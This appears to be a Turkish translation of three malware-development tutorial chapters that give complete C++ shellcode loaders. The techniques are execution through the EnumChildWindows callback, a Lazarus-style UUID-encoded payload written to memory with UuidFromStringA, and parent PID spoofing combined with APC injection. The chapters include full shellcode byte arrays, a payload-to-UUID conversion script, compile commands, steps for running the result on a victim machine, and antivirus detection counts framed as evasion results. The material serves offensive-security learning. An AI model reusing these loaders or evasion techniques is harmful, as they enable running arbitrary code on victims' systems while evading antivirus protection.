34. Zararlı Yazılım Geliştirme Tüyoları. EnumChildWindows Kullanarak Shellcode Çalıştırma. C++ Örneği.
﷽
++++++++++++++++++++++++++++++++

Bu bölüm, alt pencereleri listeleyerek shellcode çalıştırmak üzerine yaptığım araştırmaların bir sonucudur.

EnumChildWindows
Alt pencerelerin tanıtıcısını, uygulama tarafından oluşturulan bir geri çağırma işlevine sağlayarak, belirtilen ana pencerenin alt pencerelerini listeler.  
EnumChildWindows, ya son alt pencere listelenene ya da geri çağırma işlevi FALSE döndürene kadar devam eder:  
BOOL EnumChildWindows(
HWND hWndParent,
WNDENUMPROC lpEnumFunc,
LPARAM lParam
);

Pratik Örnek  
Hadi, pratik bir örneğe bakalım. Bu numara oldukça basit ve önceki numaralara benzer:  
/*
* hack.cpp - run shellcode via EnumChildWindows.
C++ implementation
* @cocomelonc
* https://cocomelonc.github.io/malware/
2022/07/13/malware-injection-21.html
*/
#include <windows.h>

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";
int main(int argc, char* argv[]) {

	LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(mem, my_payload, sizeof(my_payload));
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);
	return 0;
}

İlk olarak, VirtualAlloc kullanarak mevcut işlemde bir bellek tamponu ayırıyoruz:  

LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload),
MEM_COMMIT, PAGE_EXECUTE_READWRITE);

Daha sonra payload'umuzu bu bellek bölgesine 'kopyalıyoruz':

RtlMoveMemory(mem, my_payload, sizeof(my_payload));

Daha sonra, EnumChildWindows işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:  

EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

Her zamanki gibi, basitlik adına meow-meow mesaj kutusu payload'unu kullandım:  

unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

Demo

Her şeyi eylemde görelim. Zararlı yazılımımızı derleyelim:  

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++

Ve kurbanın makinesinde çalıştırıyoruz:  

.\hack.exe
++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim: 
 
++++++++++++++++++++++++++++++++

Sonuç olarak, 69 antivirüs motorundan 20 tanesi dosyamızı zararlı olarak algıladı.  

https://www.virustotal.com/gui/file/71c4294f90d6d6c3686601b519c2401a58bb1fb0
3ab9ca3975eca7231af77853/detection

Umarım bu bölüm, bu ilginç teknik hakkında mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.  

EnumChildWindows(https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumchildwindows)
Github’taki kaynak kod: https://github.com/cocomelonc/2022-07-13-malware-injection-21

35. Zararlı Yazılım Geliştirme Tüyoları. Lazarus Group Tarzı Shellcode Çalıştırma. C++ Örneği.

﷽

++++++++++++++++++++++++++++++++

Bu yazı, başka bir ilginç numara üzerine yaptığım araştırmaların bir sonucudur: UuidFromStringA ve EnumChildWindows kullanarak payload çalıştırma.

UuidFromStringA 

Bu işlev, bir dizeyi UUID'ye dönüştürür:  
RPC_STATUS UuidFromStringA(
RPC_CSTR StringUuid,
UUID *Uuid
);

Standard memcpy veya WriteProcessMemory işlevlerini kullanmadan, bu işlev verileri çözmek ve belleğe yazmak için kullanılabilir.  

Shellcode çalıştırma tekniği şu adımlardan oluşur:  
	- Bellek tahsisi (VirtualAlloc)  
	- UuidFromStringA kullanarak UUID dizilerini ikili formata dönüştürüp belleğe kaydetme  
	- EnumChildWindows (veya EnumDesktopsA ya da başka bir aday) kullanarak belleğe yüklenen payload'u yürütme  

Pratik Örnek

Hadi, pratik bir örneğe bakalım. Bu numara oldukça basit ve önceki numaralara benzer, ancak Lazarus Group'a özgü bazı değişiklikler içerir.  

İlk olarak, istediğimiz payload'u UUID geçerli dizelere dönüştürmek için bir betiğe ihtiyacımız var. Örneğin payload_uuid.py:  

#!usr/bin/python3

from uuid import UUID
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-p','--payload', required = True, help = "payload: binary file")
args = vars(parser.parse_args())
pbin = args['payload']

with open(pbin, "rb") as f:
	# read in 16 bytes from our input payload
	chunk = f.read(16)
	while chunk:
		# if the chunk is less than 16 bytes then we pad the difference (x90)
		if len(chunk) < 16:
			padding = 16 - len(chunk)
			chunk = chunk + (b"\x90" * padding)
		print(UUID(bytes_le=chunk))
	chunk = f.read(16)

Her zamanki gibi, meow-meow mesaj kutusu payload'u (meow.bin) kullanacağım.  

Çalıştır:  

python3 payload_uuid.py -p meow.bin
++++++++++++++++++++++++++++++++

Artık payload'umuzu UUID formatında elde ettiğimize göre, aşağıdaki kodu test etmek için bir kavram kanıtı oluşturabiliriz:  
#include <windows.h>
#include <rpc.h>
#include <iostream>

#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] = {
	"e48148fc-fff0-ffff-e8d0-000000415141",
	"56515250-3148-65d2-488b-52603e488b52",
	"8b483e18-2052-483e-8b72-503e480fb74a",
	"c9314d4a-3148-acc0-3c61-7c022c2041c1",
	"01410dc9-e2c1-52ed-4151-3e488b52203e",
	"483c428b-d001-8b3e-8088-0000004885c0",
	"01486f74-50d0-8b3e-4818-3e448b402049",
	"5ce3d001-ff48-3ec9-418b-34884801d64d",
	"3148c931-acc0-c141-c90d-4101c138e075",
	"034c3ef1-244c-4508-39d1-75d6583e448b",
	"01492440-66d0-413e-8b0c-483e448b401c",
	"3ed00149-8b41-8804-4801-d0415841585e",
	"58415a59-5941-5a41-4883-ec204152ffe0",
	"5a594158-483e-128b-e949-ffffff5d49c7",
	"000000c1-3e00-8d48-95fe-0000003e4c8d",
	"00010985-4800-c931-41ba-45835607ffd5",
	"41c93148-f0ba-a2b5-56ff-d54d656f772d",
	"776f656d-0021-5e3d-2e2e-5e3d00909090"
};

int main() {
	int elems = sizeof(uuids) / sizeof(uuids[0]);
	VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000,
	PAGE_EXECUTE_READWRITE);
	DWORD_PTR hptr = (DWORD_PTR)mem;
	for (int i = 0; i < elems; i++) {
		// printf("[*] Allocating %d of %d uuids\n", i + 1, elems);
		// printf("%s\n", *(uuids+i));
		RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
		RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
		if (status != RPC_S_OK) {
			printf("[-] UUID convert error\n");
			CloseHandle(mem);
			return-1;
		}
		hptr += 16;
	}
	EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

	// EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
	CloseHandle(mem);
	return 0;
}

UuidFromStringA işlevine dikkat edin. Daha önce yazdığım gibi, bu API'yi bir UUID işaretçisi yerine bir bellek işaretçisi ile çağırmak, verilen UUID'nin ikili temsilinin bellekte saklanmasına neden olur.  

Birçok API isteğini zincirleyerek ve uygun şekilde tasarlanmış UUID'ler vererek, gerekli içeriği (payload) seçilen bellek bölgesine yüklemek mümkündür.  

Ve ardından, EnumChildWindows işlevindeki geri çağırma işlevine işaretçi olarak bu bellek bölgesini belirtiyoruz:  

EnumChildWindows(NULL, (WNDENUMPROC)mem, NULL);

veya başka bir işlev EnumDesktopsA:  

EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);

Demo

Her şeyi eylemde görmek için zararlı kodumuzu derleyelim:

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lrpcrt4

++++++++++++++++++++++++++++++++

ve kurbanın makinesinde çalıştıralım:

.\hack.exe

++++++++++++++++++++++++++++++++

Payload'umuzun gerçekten çalıştığından emin olmak için kodun bir kısmını biraz değiştirebilirsiniz:  

printf("[*] Hexdump: ");
for (int i = 0; i < elems*16; i++) {
	printf("%02X ", ((unsigned char*)mem)[i]);
}

Daha sonra tekrar derleyin:  

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ \
-L/usr/x86_64-w64-mingw32/lib/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ -static-libgcc \
-fpermissive -lrpcrt4

++++++++++++++++++++++++++++++++

Ve tekrar çalıştırın:  

.\hack.exe

++++++++++++++++++++++++++++++++

Gördüğünüz gibi, her şey mükemmel bir şekilde çalıştı :)  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim:  
++++++++++++++++++++++++++++++++


Sonuç olarak, 68 antivirüs motorundan 6 tanesi dosyamızı zararlı olarak algıladı.  

Bir sorun var.Lazarus Group, HeapCreate ve HeapAlloc işlevlerini kullanmayı tercih ediyor:

HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
void* mem = HeapAlloc(hc, 0, 0x100000);  

HeapAlloc, yığın belleği tahsis etmek için sık kullanılan bir API çağrısıdır.  
Bu API, bildiğim kadarıyla, VirtualAlloc API'si yerine yığından belirli miktarlarda bellek ayırmanıza olanak tanır. Ancak belgelerine göre, gerekirse HeapAlloc hala VirtualAlloc'u çağırabilir.  

Ayrıca bu API, o kadar şüpheli kabul edilmez.  

Lazarus Group ayrıca payload'u yürütmek için EnumSystemLocalesA işlevini kullanır.  

Umarım bu yazı, mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerine ilham olur.  

nccgroup - RIFT: Analysing a Lazarus Shellcode Execution Method(https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/)
Lazarus Group(https://attack.mitre.org/groups/G0032/)
Github’taki kaynak kod: https://github.com/cocomelonc/meow/tree/master/2022-07-21-malware-tricks-22

36. Zararlı Yazılım Geliştirme Tüyoları. Parent PID Spoofing. Basit C++ Örneği.

﷽

++++++++++++++++++++++++++++++++

Bu makale, parent process ID spoofing üzerine yaptığım kendi araştırmalarımın bir sonucudur.

Parent PID Spoofing  

Parent ve child süreçler arasındaki ilişkileri izlemek, tehdit avı ekipleri tarafından kötü amaçlı etkinlikleri belirlemek için kullanılan yaygın bir yöntemdir. Kırmızı takım üyeleri, Parent PID Spoofing yöntemini bir kaçış yöntemi olarak benimsemiştir.  CreateProcess Windows API çağrısı, Parent PID'yi belirlemenize olanak tanıyan bir parametreyi destekler.  
Bu, kötü amaçlı bir işlemin oluşturulduğunda çalıştırılan işlemden farklı bir parent kullanabileceği anlamına gelir.  

Pratik Örnek

Hadi pratik bir örneğe bakalım. İlk olarak, diyelim ki elimizde bir süreç var, örneğin mspaint.exe:


++++++++++++++++++++++++++++++++

PID'sinin 3396 olduğunu görebilirsiniz. Parent süreci (PID: 2876) explorer.exe'dir:  

 ++++++++++++++++++++++++++++++++

Process Hacker kullanarak, mevcut dizinin C:\Windows\System32 olduğunu da görebiliriz:  

++++++++++++++++++++++++++++++++

Bu numaranın yürütme akışı şu adımları içerir:  
- explorer.exe PID'sini aldım: 

int pid = findMyProc(argv[1]);
if (pid) {
	printf("PID = %d\n", pid);
}

HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid); 

Mspaint.exe sürecini oluşturalım:

CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, TRUE,
CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT,
NULL, NULL, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000,
MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

Oluşturulan süreç belleğine meow-meow payload'unu yazın:

BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload, sizeof(my_payload), nb);

Oluşturulan işlemin iş parçacığına, APC kuyruğuna bir kullanıcı modu asenkron işlem çağrısı (APC) nesnesi ekleyin:  

QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);

İş parçacığını devam ettirin:  

ResumeThread(pi.hThread);
CloseHandle(pi.hThread);

Tam kaynak kod:
/*
hack.cpp
parent PID spoofing with APC
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/06/malware-tricks-23.html
*/
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int findMyProc(const char *procname) {
	HANDLE hSnapshot;
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	// snapshot of all processes in the system
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

	// initializing size: needed for using Process32First
	pe.dwSize = sizeof(PROCESSENTRY32);

	// info about first process encountered in a system snapshot
	hResult = Process32First(hSnapshot, &pe);

	// retrieve information about the processes
	// and exit if unsuccessful
	while (hResult) {
		// if we find the process: return process ID
		if (strcmp(procname, pe.szExeFile) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
		hResult = Process32Next(hSnapshot, &pe);
	}

	// closes an open handle (CreateToolhelp32Snapshot)
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {
	unsigned char my_payload[] =
	// 64-bit meow-meow messagebox
	"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
	"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
	"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
	"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
	"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
	"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
	"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
	"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
	"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
	"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
	"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
	"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
	"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
	"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
	"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
	"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
	"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
	"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
	"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
	"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
	"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
	"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
	"\x2e\x2e\x5e\x3d\x00";

	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T st;
	int pid = findMyProc(argv[1]);
	if (pid) {
		printf("PID = %d\n", pid);
	}

	HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, false, (DWORD)pid);

	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	InitializeProcThreadAttributeList(NULL, 1, 0, &st);
	si.lpAttributeList =
	(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, st);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &st);
	UpdateProcThreadAttribute(si.lpAttributeList, 0,
	PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
	si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
	CreateProcessA("C:\\Windows\\System32\\mspaint.exe", NULL, NULL, NULL, TRUE,
CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL,
	NULL, reinterpret_cast<LPSTARTUPINFOA>(&si), &pi);
	LPVOID ba = (LPVOID)VirtualAllocEx(pi.hProcess, NULL, 0x1000, MEM_RESERVE |
	MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	SIZE_T *nb = 0;
	BOOL res = WriteProcessMemory(pi.hProcess, ba, (LPVOID)my_payload,
	sizeof(my_payload), nb);
	QueueUserAPC((PAPCFUNC)ba, pi.hThread, 0);
	ResumeThread(pi.hThread);
	CloseHandle(pi.hThread);
	return 0;
}  

Gördüğünüz gibi, önceki gönderilerimden kodu yeniden kullandım.  
Burada, başlatılan süreci biraz sabitledim; bunu komut satırı parametrelerinden alacak şekilde değiştirebilirsiniz.  

Demo

Kodumuzu derleyelim: 

x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-mwindows -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive

++++++++++++++++++++++++++++++++

kurbanın makinesinde çalıştıralım:  

.\hack.exe explorer.exe

++++++++++++++++++++++++++++++++

Process Hacker'ı çalıştırın ve görebileceğiniz gibi, mspaint.exe süreci başarıyla oluşturuldu (PID: 4720):  

++++++++++++++++++++++++++++++++

Ve:  
++++++++++++++++++++++++++++++++

++++++++++++++++++++++++++++++++


Gördüğünüz gibi, parent süreç 2876, bu explorer.exe'ye karşılık geliyor, ancak mevcut dizin Z:\2022-09-06-malware-tricks-23!  

Ve süreç belleğinde ne olduğuna bakalım:

++++++++++++++++++++++++++++++++

Her şey mükemmel bir şekilde çalıştı :)  

Aslında sizi biraz kandırdım. Örneğimde sadece parent süreç spoofing yapılmadı. 
Bu, PPID spoofing ve APC enjeksiyonunun bir kombinasyonudur. Çünkü ben de sizin gibi yeni şeyler öğreniyorum ve bazen kendinize sorular sormaktan ve denemekten korkmamalısınız.  

Şimdi hack.exe dosyamızı VirusTotal'a yükleyelim:

++++++++++++++++++++++++++++++++

Sonuç olarak, 70 antivirüs motorundan 20 tanesi dosyamızı zararlı olarak algıladı.  

https://www.virustotal.com/gui/file/3ec9f1080253f07695f0958ae84e99ff065f052c
409f0f7e3e1a79cd4385a9d5/detection

Bu teknik, Cobalt Strike ve KONNI RAT tarafından kullanılır.  
Örneğin, Cobalt Strike alternatif PPID'lerle süreçler başlatabilir.  

Bu teknik, ilk olarak 2009'da Didier Stevens tarafından daha geniş bilgi güvenliği topluluğuna tanıtıldı.  

Umarım bu yazı, mavi takım üyelerine farkındalık kazandırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler. 

Didier Stevens: That Is Not My Child Process!( https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/)
MITRE ATT&CK: Parent PID spoofing(https://attack.mitre.org/techniques/T1134/004/)
Cobalt Strike(https://attack.mitre.org/software/S0154/)
KONNI(https://attack.mitre.org/software/S0356/)
CreateProcessA(https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
Find process ID by name and inject to it(https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)
APC injection technique(https://cocomelonc.github.io/pentest/2021/09/29/findmyprocess.html)
Github’taki kaynak kod: https://github.com/cocomelonc/meow/tree/master/2022-09-06-malware-tricks-23
